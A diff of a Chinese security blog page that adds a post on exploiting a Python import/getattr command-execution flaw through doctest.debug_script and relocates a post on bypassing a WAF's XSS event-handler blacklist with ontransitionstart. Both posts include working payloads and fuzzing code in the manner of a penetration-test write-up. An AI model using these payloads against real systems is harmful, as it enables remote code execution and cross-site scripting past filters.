@@ -125,7 +125,7 @@
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">58</span>
+          <span class="site-state-item-count">59</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -240,6 +240,90 @@
 </ul>
 </li>
 </ul>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021-12-26-Python%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8CCase/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="leveryd">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="leveryd的个人博客">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2021-12-26-Python%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8CCase/" class="post-title-link" itemprop="url">Python命令执行Case</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2021-12-26 15:33:56" itemprop="dateCreated datePublished" datetime="2021-12-26T15:33:56+08:00">2021-12-26</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h1 id="问题背景"><a href="#问题背景" class="headerlink" title="问题背景"></a>问题背景</h1><p>在一次安全评估过程中，遇到了一个命令执行的点，但是存在部分限制。</p>
+<p>服务是用Python写的，漏洞点的代码精简一下大概如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">import importlib</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class AnyClass(object):</span><br><span class="line">    pass</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">user_input_module &#x3D; &quot;&quot;   # 用户可控</span><br><span class="line">user_input_function &#x3D; &quot;&quot;  # 用户可控</span><br><span class="line">user_input_argument &#x3D; &quot;&quot;  # 用户可控</span><br><span class="line">imp_module &#x3D; importlib.import_module(user_input_module)</span><br><span class="line">func &#x3D; getattr(imp_module, user_input_function)</span><br><span class="line"></span><br><span class="line">arg &#x3D;  bytes(user_input_argument.encode(&quot;utf-8&quot;))</span><br><span class="line">func(arg, AnyClass())   # 第二个参数必须存在</span><br></pre></td></tr></table></figure>
+
+<p>大概就是 <code>任意模块.任意函数(任意字符串,不可控的实例参数)</code> 。</p>
+<p>因为第二个参数必须存在，所以不能简单的调用 <code>os.system</code>函数来执行命令。</p>
+<p>我的想法就变成，怎么找到一个方法能够执行命令，且这个方法有两个参数，且第二个参数不影响命令执行。</p>
+<h1 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h1><p>想到去遍历Python库，来看看有没有满足上述条件的方法。</p>
+<p>于是写了一小段代码来遍历Python默认安装的所有模块，扔给指定参数来尝试调用模块中的方法。如果没有报错，就打印函数后人工排查一下。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"># coding:utf-8</span><br><span class="line">import os</span><br><span class="line">import re</span><br><span class="line">import importlib</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class AnyClass(object):</span><br><span class="line">    pass</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def fuzz_object(o):</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    :param o:</span><br><span class="line">    :return:</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    for k in o.__dict__:  </span><br><span class="line">        # print(k)</span><br><span class="line">        v &#x3D; o.__dict__[k]</span><br><span class="line">        if callable(v):   # 遍历模块所有的函数</span><br><span class="line">            try:</span><br><span class="line">                v(b&quot;xxxx&quot;, AnyClass())   # 如果函数接受两个参数，且第一个参数是bytes类型，第二个参数可以是任意实例，就把函数名打印出来。</span><br><span class="line">                print(o.__file__, k)</span><br><span class="line">            except Exception as _:</span><br><span class="line">                pass</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &quot;__main__&quot;:</span><br><span class="line">    abs_path &#x3D; &quot;&#x2F;usr&#x2F;local&#x2F;Cellar&#x2F;python&#x2F;3.7.7&#x2F;Frameworks&#x2F;Python.framework&#x2F;Versions&#x2F;3.7&#x2F;lib&#x2F;python3.7&quot;</span><br><span class="line">    for i in os.listdir(abs_path):  # 遍历Python自带的基础库</span><br><span class="line">        if os.path.isfile(abs_path + &quot;&#x2F;&quot; + i):</span><br><span class="line">            imp_module &#x3D; re.sub(r&#39;\.py$&#39;, &quot;&quot;, i)</span><br><span class="line">            try:</span><br><span class="line">                ip_module &#x3D; importlib.import_module(imp_module)</span><br><span class="line"></span><br><span class="line">                fuzz_object(ip_module)</span><br><span class="line">            except Exception as _:</span><br><span class="line">                print(_)</span><br><span class="line">            except KeyboardInterrupt:</span><br><span class="line">                pass</span><br><span class="line">        elif i not in [&quot;.&quot;, &quot;..&quot;]:  # 这里就不处理目录了</span><br><span class="line">            pass</span><br></pre></td></tr></table></figure>
+
+<p>结果测出很多函数都可以正常运行，没有报错。</p>
+<p>先说最终结论，<code>doctest.debug_script</code>函数完全满足要求</p>
+<p>测试一下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">import importlib</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class AnyClass(object):</span><br><span class="line">    pass</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">user_input_module &#x3D; &quot;doctest&quot;</span><br><span class="line">user_input_function &#x3D; &quot;debug_script&quot;</span><br><span class="line">user_input_argument &#x3D; &quot;import os;os.system(&#39;touch &#x2F;tmp&#x2F;qwer&#39;)&quot;  # 执行 touch &#x2F;tmp&#x2F;qwer</span><br><span class="line">imp_module &#x3D; importlib.import_module(user_input_module)</span><br><span class="line">func &#x3D; getattr(imp_module, user_input_function)</span><br><span class="line"></span><br><span class="line">arg &#x3D;  bytes(user_input_argument.encode(&quot;utf-8&quot;))</span><br><span class="line">func(arg, AnyClass())</span><br></pre></td></tr></table></figure>
+
+<p>测试过程中，也发现有很多其他的部分满足需求的函数，这里也一并记录。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">os.getenvb  可以读环境变量</span><br><span class="line"></span><br><span class="line">eval(xx,&#123;&#125;) 可以命令执行，但是需要第二个参数是dict</span><br><span class="line"></span><br><span class="line">pickletools.dis  输出opcode</span><br><span class="line"></span><br><span class="line">webbrowser.open(&quot;http:&#x2F;&#x2F;www.baidu.com&quot;,object)</span><br><span class="line"></span><br><span class="line">.&#x2F;idlelib&#x2F;calltip.get_entity</span><br><span class="line"></span><br><span class="line">timeit.timeit()  符合要求</span><br><span class="line"></span><br><span class="line">os.fwalk</span><br><span class="line"></span><br><span class="line">doctest.debug_script  完全符合要求，可以用来命令执行</span><br></pre></td></tr></table></figure>
+
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>寻找满足特定条件的X时，用遍历的思想让程序去找，总会有点收获。</p>
+<p>在另外一次针对bash脚本代码审计时也用到了这个简单但有效果的方法，找到了突破点。后面会写一篇介绍 ：）</p>
 
       
     </div>
@@ -386,126 +470,6 @@
   
 
   <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021-12-26-WAF%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5(4)/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="leveryd">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="leveryd的个人博客">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2021-12-26-WAF%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5(4)/" class="post-title-link" itemprop="url">WAF攻防实践(4)</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">发表于</span>
-
-      <time title="创建时间：2021-12-26 15:33:56" itemprop="dateCreated datePublished" datetime="2021-12-26T15:33:56+08:00">2021-12-26</time>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p>上周在做安全测试时，发现站点的xss能够插入标签，当我想用on事件来执行javascript脚本时，发现被waf拦截了。</p>
-<p>经常怼waf的，应该会碰到过，waf针对标签on属性名的拦截策略分为两种：</p>
-<ul>
-<li>on属性名在黑名单列表</li>
-<li>以on开头，且满足其他条件，比如字符串长度大于一定长度</li>
-</ul>
-<p>举个例子，payload包含<code>&lt;div onXXXXX=alert(1)&gt;</code>时，按照第一种策略，只有<code>onXXXXX</code>在黑名单列表中，才会被拦截。第二种策略就直接拦截了，因为<code>onXXXXX</code>以<code>on</code>开头，且还比较长。</p>
-<p>本文碰到的waf拦截策略是第一种，所以只要找到一个on属性不在黑名单列表中，就应该可以绕过。</p>
-<p>所以问题变成了：</p>
-<ul>
-<li>怎么找到所有的on属性？</li>
-<li>怎么判断哪个on属性没有被过滤？</li>
-<li>怎么利用未过滤的on事件？</li>
-</ul>
-<h1 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h1><ul>
-<li><p>怎么找到所有的on属性？</p>
-<p>前端遍历BOM对象document的属性即可</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">let results &#x3D; []</span><br><span class="line">for (let i in document)&#123;</span><br><span class="line">  if(i.startsWith(&quot;on&quot;))&#123;</span><br><span class="line">    results.push(i)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">console.log(results)</span><br><span class="line">localStorage.onAttrs&#x3D;JSON.stringify(results)</span><br></pre></td></tr></table></figure>
-
-<p>因为results字符串非常长，会在chrome控制台会被截断，所以把它存到localStorage中，结果在 Chrome devtool -&gt; Application -&gt; Storage 中可以找到。</p>
-</li>
-<li><p>怎么判断哪个on属性没有被过滤？</p>
-<p>用burpsuite的intruder爆破模块过一遍，发现有两个属性没有拦截：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ontransitionstart</span><br><span class="line">onbeforexrselect</span><br></pre></td></tr></table></figure>
-
-<p>这两个属性我之前也没见过，那怎么利用这两个属性执行js呢？</p>
-</li>
-<li><p>怎么利用<code>ontransitionstart</code>属性？</p>
-<p>根据<a target="_blank" rel="noopener" href="https://developer.mozilla.org/en-US/docs/Web/API/HTMLElement/transitionstart_event">MDN-transitionstart文档</a>构造出利用方式：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;div class&#x3D;&quot;transition&quot; ontransitionstart&#x3D;&quot;alert(1)&quot;&gt;Hover over me&lt;&#x2F;div&gt;</span><br><span class="line"></span><br><span class="line">&lt;style&gt;</span><br><span class="line">.transition &#123;</span><br><span class="line">  width: 10000px;</span><br><span class="line">  height: 10000px;</span><br><span class="line">  background: rgba(255,0,0,1);</span><br><span class="line">  transition-property: transform, background;</span><br><span class="line">  transition-duration: 1s;</span><br><span class="line">  transition-delay: 1s;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">.transition:hover &#123;</span><br><span class="line">  transform: rotate(90deg);</span><br><span class="line">  background: rgba(255,0,0,0);</span><br><span class="line">&#125;</span><br><span class="line">&lt;&#x2F;style&gt;</span><br></pre></td></tr></table></figure>
-
-<p>虽然文档写的chrome和firefox都支持transitionstart事件，但是上面的利用payload实际测试结果：</p>
-<blockquote>
-<p>firefox可以、chrome不行</p>
-</blockquote>
-<p>chrome用addEventListener可以监听<code>transitionstart</code>事件，但不能用<code>ontransitionstart</code>来监听事件。这个原因不知道为啥。</p>
-</li>
-<li><p>怎么利用<code>onbeforexrselect</code>属性？</p>
-<p>根据<a target="_blank" rel="noopener" href="https://immersive-web.github.io/dom-overlays/">onbeforexrselect文档</a>来看，似乎<code>beforexrselect</code>事件还只是一个草案。</p>
-<p>也因为transitionstart事件已经能利用了，所以也没有再研究。</p>
-</li>
-</ul>
-<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><ul>
-<li><p>从防守方来看，如果采用了on事件黑名单，就需要保证事件黑名单的全面。</p>
-</li>
-<li><p>chrome和firefox on属性有区别，或许可以作为一个区分浏览器的指纹特征（虽然感觉很不稳定）。</p>
-</li>
-<li><p>测试过程中，我还有一个疑问：不同元素之间的on属性是否会不同，比如div元素和document元素遍历出来的on属性是否会不同。有知道答案的读者可以后台告诉我。</p>
-</li>
-</ul>
-<h1 id="PS"><a href="#PS" class="headerlink" title="PS"></a>PS</h1><p>我个人把防火墙的绕过分为两个类别：</p>
-<ul>
-<li>架构层面的绕过，这种绕过不太关心具体的漏洞类型是xss还是sql注入</li>
-<li>漏洞类型相关的绕过</li>
-</ul>
-<p>第一种架构层面的绕过姿势比较难找，这种较为通用的绕过姿势，从攻击队视角来看我觉得比较适合扫描器来绕过防火墙。这也是<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/qAv2wspeuCfhCjTaz03hNg">你的扫描器可以绕过防火墙么</a>系列文章名称的由来。</p>
-<p>后面就都写到这个”waf攻防实践”系列里来。</p>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021-12-26-WAF%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5(5)/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -600,6 +564,126 @@
 <h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>厂商只要转发包时，抹去所有tcp options字段 或者 检查tcp opitons有没有奇怪的kind，就可以避免这个问题，这也是我觉得这种问题出现概率不高的原因。我没有对很多厂商做测试，如果大家有啥新发现，可以公众号后台私信我。</p>
 <p>另外我把数据包文件放在了<a target="_blank" rel="noopener" href="https://github.com/leveryd/picture/blob/main/test.pcap">test.pcap</a>，如果对tcp options格式字段有疑问，就可以用wireshark打开数据包看看。</p>
 <p>留给读者一个问题：nmap -S 参数也能伪造源ip，它和本文这种方式有什么区别呢？</p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021-12-26-WAF%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5(4)/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="leveryd">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="leveryd的个人博客">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2021-12-26-WAF%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5(4)/" class="post-title-link" itemprop="url">WAF攻防实践(4)</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2021-12-26 15:33:56" itemprop="dateCreated datePublished" datetime="2021-12-26T15:33:56+08:00">2021-12-26</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p>上周在做安全测试时，发现站点的xss能够插入标签，当我想用on事件来执行javascript脚本时，发现被waf拦截了。</p>
+<p>经常怼waf的，应该会碰到过，waf针对标签on属性名的拦截策略分为两种：</p>
+<ul>
+<li>on属性名在黑名单列表</li>
+<li>以on开头，且满足其他条件，比如字符串长度大于一定长度</li>
+</ul>
+<p>举个例子，payload包含<code>&lt;div onXXXXX=alert(1)&gt;</code>时，按照第一种策略，只有<code>onXXXXX</code>在黑名单列表中，才会被拦截。第二种策略就直接拦截了，因为<code>onXXXXX</code>以<code>on</code>开头，且还比较长。</p>
+<p>本文碰到的waf拦截策略是第一种，所以只要找到一个on属性不在黑名单列表中，就应该可以绕过。</p>
+<p>所以问题变成了：</p>
+<ul>
+<li>怎么找到所有的on属性？</li>
+<li>怎么判断哪个on属性没有被过滤？</li>
+<li>怎么利用未过滤的on事件？</li>
+</ul>
+<h1 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h1><ul>
+<li><p>怎么找到所有的on属性？</p>
+<p>前端遍历BOM对象document的属性即可</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">let results &#x3D; []</span><br><span class="line">for (let i in document)&#123;</span><br><span class="line">  if(i.startsWith(&quot;on&quot;))&#123;</span><br><span class="line">    results.push(i)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">console.log(results)</span><br><span class="line">localStorage.onAttrs&#x3D;JSON.stringify(results)</span><br></pre></td></tr></table></figure>
+
+<p>因为results字符串非常长，会在chrome控制台会被截断，所以把它存到localStorage中，结果在 Chrome devtool -&gt; Application -&gt; Storage 中可以找到。</p>
+</li>
+<li><p>怎么判断哪个on属性没有被过滤？</p>
+<p>用burpsuite的intruder爆破模块过一遍，发现有两个属性没有拦截：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ontransitionstart</span><br><span class="line">onbeforexrselect</span><br></pre></td></tr></table></figure>
+
+<p>这两个属性我之前也没见过，那怎么利用这两个属性执行js呢？</p>
+</li>
+<li><p>怎么利用<code>ontransitionstart</code>属性？</p>
+<p>根据<a target="_blank" rel="noopener" href="https://developer.mozilla.org/en-US/docs/Web/API/HTMLElement/transitionstart_event">MDN-transitionstart文档</a>构造出利用方式：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;div class&#x3D;&quot;transition&quot; ontransitionstart&#x3D;&quot;alert(1)&quot;&gt;Hover over me&lt;&#x2F;div&gt;</span><br><span class="line"></span><br><span class="line">&lt;style&gt;</span><br><span class="line">.transition &#123;</span><br><span class="line">  width: 10000px;</span><br><span class="line">  height: 10000px;</span><br><span class="line">  background: rgba(255,0,0,1);</span><br><span class="line">  transition-property: transform, background;</span><br><span class="line">  transition-duration: 1s;</span><br><span class="line">  transition-delay: 1s;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">.transition:hover &#123;</span><br><span class="line">  transform: rotate(90deg);</span><br><span class="line">  background: rgba(255,0,0,0);</span><br><span class="line">&#125;</span><br><span class="line">&lt;&#x2F;style&gt;</span><br></pre></td></tr></table></figure>
+
+<p>虽然文档写的chrome和firefox都支持transitionstart事件，但是上面的利用payload实际测试结果：</p>
+<blockquote>
+<p>firefox可以、chrome不行</p>
+</blockquote>
+<p>chrome用addEventListener可以监听<code>transitionstart</code>事件，但不能用<code>ontransitionstart</code>来监听事件。这个原因不知道为啥。</p>
+</li>
+<li><p>怎么利用<code>onbeforexrselect</code>属性？</p>
+<p>根据<a target="_blank" rel="noopener" href="https://immersive-web.github.io/dom-overlays/">onbeforexrselect文档</a>来看，似乎<code>beforexrselect</code>事件还只是一个草案。</p>
+<p>也因为transitionstart事件已经能利用了，所以也没有再研究。</p>
+</li>
+</ul>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><ul>
+<li><p>从防守方来看，如果采用了on事件黑名单，就需要保证事件黑名单的全面。</p>
+</li>
+<li><p>chrome和firefox on属性有区别，或许可以作为一个区分浏览器的指纹特征（虽然感觉很不稳定）。</p>
+</li>
+<li><p>测试过程中，我还有一个疑问：不同元素之间的on属性是否会不同，比如div元素和document元素遍历出来的on属性是否会不同。有知道答案的读者可以后台告诉我。</p>
+</li>
+</ul>
+<h1 id="PS"><a href="#PS" class="headerlink" title="PS"></a>PS</h1><p>我个人把防火墙的绕过分为两个类别：</p>
+<ul>
+<li>架构层面的绕过，这种绕过不太关心具体的漏洞类型是xss还是sql注入</li>
+<li>漏洞类型相关的绕过</li>
+</ul>
+<p>第一种架构层面的绕过姿势比较难找，这种较为通用的绕过姿势，从攻击队视角来看我觉得比较适合扫描器来绕过防火墙。这也是<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/qAv2wspeuCfhCjTaz03hNg">你的扫描器可以绕过防火墙么</a>系列文章名称的由来。</p>
+<p>后面就都写到这个”waf攻防实践”系列里来。</p>
 
       
     </div>
